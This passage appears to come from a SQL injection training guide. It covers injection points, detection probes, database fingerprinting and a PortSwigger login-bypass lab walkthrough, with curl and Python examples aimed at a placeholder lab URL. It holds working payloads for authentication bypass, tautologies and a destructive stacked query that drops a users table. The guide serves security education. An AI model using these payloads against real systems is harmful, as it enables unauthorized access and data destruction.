- **Data retrieval with sorting** -- ORDER BY injection via column name or direction parameters
- **Registration forms** -- INSERT injection and second-order payload storage
- **Profile/settings pages** -- UPDATE injection for privilege escalation
- **Admin panels using stored data** -- Second-order trigger points
- **API endpoints** -- Often have weaker input validation than web forms
- **Password reset flows** -- Second-order triggers using stored username data

| Character | Purpose | Expected Behavior on Vulnerable Input |
|-----------|---------|--------------------------------------|
| \`'\` | String terminator | SQL error or broken page layout |
| \`"\` | Alternative string delimiter | SQL error in double-quote contexts |
| \`;\` | Statement separator | May trigger stacked queries behavior |
| \`)\` | Closes parenthesized expression | Unbalanced parenthesis error |
| \`--\` | Line comment | Trailing query logic removed |

## How It Works

### Query Flow Diagram

\`\`\`mermaid
flowchart TD
    A["User Input<br/>category=Electronics' OR 1=1--"] -->|HTTP Request| B["Web Application"]
    B -->|String Concatenation| C["Query Construction<br/>SELECT * FROM products<br/>WHERE category = 'Electronics' OR 1=1--'<br/>AND released = 1"]
    C -->|SQL Sent| D["Database Engine"]
    D -->|Parses modified query| E["Returns: ALL products<br/>Comment removed released=1 check"]
    E -->|Result set| F["Application Output<br/>(normal HTML page)"]
    F -->|Same channel| G["Attacker sees<br/>ALL products including<br/>unreleased items"]

    style A fill:#d32f2f,color:#fff
    style C fill:#f57c00,color:#fff
    style G fill:#d32f2f,color:#fff
\`\`\`

### Step-by-Step Mechanism

1. **Input reaches the application** -- The attacker submits crafted input through a form field, URL parameter, HTTP header, or API body
2. **String concatenation** -- The application inserts the raw input into a SQL query template using string concatenation (no parameterization)
3. **Syntax breakout** -- The attacker's quote character closes the intended string literal, transitioning from data context to code context
4. **Logic modification** -- Additional SQL syntax (OR clauses, comments, new statements) alters the query's behavior
5. **Database runs it** -- The database engine parses and runs the modified query as a valid SQL statement
6. **In-band result** -- The modified result set flows back through the application's normal rendering pipeline
7. **Attacker observes** -- Changed page content, successful login, error messages, or altered application state confirms the injection

## Detection and Validation

### Phase 1: Entry Point Discovery

Submit single characters and observe response differences:

\`\`\`
Normal:       ?id=1           -> 200 OK, product displayed
Single quote: ?id=1'          -> 500 error, SQL syntax message, or blank page
Double quote: ?id=1"          -> May trigger error in double-quote contexts
Semicolon:    ?id=1;          -> May trigger error or stacked queries behavior
\`\`\`

### Phase 2: Boolean Condition Pairs

\`\`\`
True condition:  ?id=1 AND 1=1--   -> Normal response (same as ?id=1)
False condition: ?id=1 AND 1=2--   -> Different response (empty, error, or partial)
\`\`\`

If the true condition returns the normal page and the false condition returns a different page, the parameter is injectable.

### Phase 3: String Context Identification

\`\`\`
Single-quote string: ?id=1' AND '1'='1    -> Normal response
                     ?id=1' AND '1'='2    -> Different response

Double-quote string: ?id=1" AND "1"="1    -> Normal response
                     ?id=1" AND "1"="2    -> Different response

Numeric (no quotes): ?id=1 AND 1=1        -> Normal response
                     ?id=1 AND 1=2        -> Different response
\`\`\`

### Phase 4: Comment Verification

\`\`\`
?category=Gifts'--        -> Returns Gifts products (trailing SQL removed)
?category=Gifts'#         -> Same (MySQL hash comment)
?category=Gifts'/*        -> Same (block comment)
\`\`\`

### Phase 5: Tautology Confirmation

\`\`\`
?category=Gifts' OR 1=1--    -> Returns ALL products (tautology bypasses filter)
\`\`\`

| Inject | MySQL Response | PostgreSQL Response | MSSQL Response | Oracle Response |
|--------|---------------|--------------------|-----------------|--------------------|
| \`'\` | \`You have an error in your SQL syntax\` | \`ERROR: syntax error at or near\` | \`Unclosed quotation mark\` | \`ORA-00933: SQL command not properly ended\` |
| \`conv('a',16,2)=conv('a',16,2)\` | TRUE | Error | Error | Error |
| \`5::int=5\` | Error | TRUE | Error | Error |
| \`@@CONNECTIONS>0\` | Error | Error | TRUE | Error |
| \`ROWNUM=ROWNUM\` | Error | Error | Error | TRUE |
| \`'foo' 'bar'='foobar'\` | TRUE (implicit concat) | Error | Error | Error |

## Beginner Lab Walkthrough

### PortSwigger Lab: "SQL injection vulnerability allowing login bypass"

**Lab URL:** https://portswigger.net/web-security/sql-injection/lab-login-bypass
**Difficulty:** APPRENTICE (free, no Burp Pro required)
**Goal:** Log in as the \`administrator\` user.

#### Step 1: Understand the Vulnerable Query

The login form runs:

\`\`\`sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
\`\`\`

If this returns a row, the application grants access.

#### Step 2: Craft the Payload

**Username field:** \`administrator'--\`
**Password field:** anything (leave blank or type gibberish)

#### Step 3: Understand Why It Works

The application constructs:

\`\`\`sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
\`\`\`

The \`'\` after \`administrator\` closes the username string literal. The \`--\` comments out the rest of the query, including the entire \`AND password = ''\` check. The effective query becomes:

\`\`\`sql
SELECT * FROM users WHERE username = 'administrator'
\`\`\`

This returns the administrator row without verifying any password.

#### Step 4: Execute Without Burp Pro

**Option A -- Browser only:**
1. Navigate to the lab's login page
2. Type \`administrator'--\` in the username field
3. Type anything in the password field
4. Click "Log in"

**Option B -- curl:**

\`\`\`bash
curl -X POST 'https://LAB-URL/login' \\
  -d "username=administrator'--&password=x" \\
  -L -v
\`\`\`

**Option C -- Python:**

\`\`\`python
import requests
r = requests.post('https://LAB-URL/login',
    data={'username': "administrator'--", 'password': 'x'},
    allow_redirects=True)
print(r.status_code, 'administrator' in r.text)
\`\`\`

#### Common Mistakes

| Mistake | Fix |
|---------|-----|
| Forgetting the space after \`--\` on MySQL | Use \`-- \` (with trailing space) or \`--+\` (URL-encoded space) or \`#\` |
| Injecting in password field instead of username | The payload must match the query position -- \`administrator'--\` works in the username field because it targets the username comparison and comments out the password check |
| Double-quoting when the context uses single quotes | Test with \`'\` first; if no error, try \`"\` |
| Using \`OR 1=1\` when only one account is needed | \`OR 1=1\` returns ALL users; the app may error on multi-row results. Use \`administrator'--\` for targeted login |

## Techniques

### Level 0: Understanding Query Context

Before injecting, determine the syntactic context of your input within the SQL query.

**String context (most common):**

\`\`\`sql
-- Your input goes inside single quotes:
SELECT * FROM users WHERE name = '[INPUT]'
-- Break out with: ' (single quote)
\`\`\`

**Numeric context:**

\`\`\`sql
-- Your input is used as a bare number:
SELECT * FROM products WHERE id = [INPUT]
-- No quote needed to inject: just append SQL
\`\`\`

**Identifier context (rare, high value):**

\`\`\`sql
-- Your input names a column or table:
SELECT * FROM products ORDER BY [INPUT]
-- UNION/WHERE not available; use conditional logic
\`\`\`

**Parenthesized context:**

\`\`\`sql
-- Your input is inside parentheses:
SELECT * FROM users WHERE (name = '[INPUT]') AND active = 1
-- Must close the parenthesis: ') OR 1=1--
\`\`\`

---

### Level 1: Tautology and Comment Truncation

**Tautology (always-true condition):**

The injected \`OR 1=1\` makes the WHERE clause evaluate to TRUE for every row.

\`\`\`sql
-- Original:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
-- Injected:
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
-- Result: all products returned
\`\`\`

**Comment truncation (remove trailing logic):**

The \`--\` (or \`#\` on MySQL) comments out everything after the injection point.

\`\`\`sql
-- Original:
SELECT * FROM users WHERE username = 'admin' AND password = 'secret'
-- Injected (username = admin'--):
SELECT * FROM users WHERE username = 'admin'--' AND password = 'secret'
-- Result: password check removed, admin access granted
\`\`\`

**Comment syntax per database:**

| Database | Line Comment | Block Comment | Special |
|----------|-------------|---------------|---------|
| MySQL | \`-- \` (trailing space required) | \`/* */\` | \`#\`, \`/*!50000 code */\` |
| PostgreSQL | \`--\` | \`/* */\` | Nested \`/* /* */ */\` supported |
| MSSQL | \`--\` | \`/* */\` | None |
| Oracle | \`--\` | \`/* */\` | None |
| SQLite | \`--\` | \`/* */\` | None |

---

### Level 2: Database-Specific Syntax, Numeric Context, Stacked Queries

**Numeric context injection:**

When input maps to \`WHERE id = $input\` (no quotes), injection requires no quote breakout:

\`\`\`sql
-- Original:  SELECT * FROM products WHERE id = 1
-- Injected:  SELECT * FROM products WHERE id = 1 OR 1=1--
\`\`\`

**String concatenation per database:**

| Database | Method | Example |
|----------|--------|---------|
| MySQL | Implicit adjacent strings | \`'foo' 'bar'\` produces \`foobar\` |
| MySQL | \`CONCAT()\` | \`CONCAT('foo','bar')\` |
| PostgreSQL | Pipe operator | \`'foo' \\|\\| 'bar'\` |
| MSSQL | Plus operator | \`'foo' + 'bar'\` |
| Oracle | Pipe operator | \`'foo' \\|\\| 'bar'\` |
| SQLite | Pipe operator | \`'foo' \\|\\| 'bar'\` |

**Stacked queries:**

Terminate the current statement with \`;\` and inject a completely new statement. This is the most dangerous form of classic injection because stacked queries can run **any** statement type.

\`\`\`sql
-- Original:  SELECT * FROM products WHERE id = '1'
-- Injected:  SELECT * FROM products WHERE id = '1'; DROP TABLE users--'
\`\`\`

**Stacked query support matrix:**

| Database | Support | Notes |
|----------|---------|-------|
| MSSQL | Full | All APIs support stacking |
| PostgreSQL | Full | All APIs support stacking |
| SQLite | Full | Most interfaces support it |
| MySQL | Conditional | Requires \`multi_query()\` or PDO emulation; standard \`mysql_query()\` blocks it |
| Oracle | None | Does not support stacked queries via standard SQL injection |
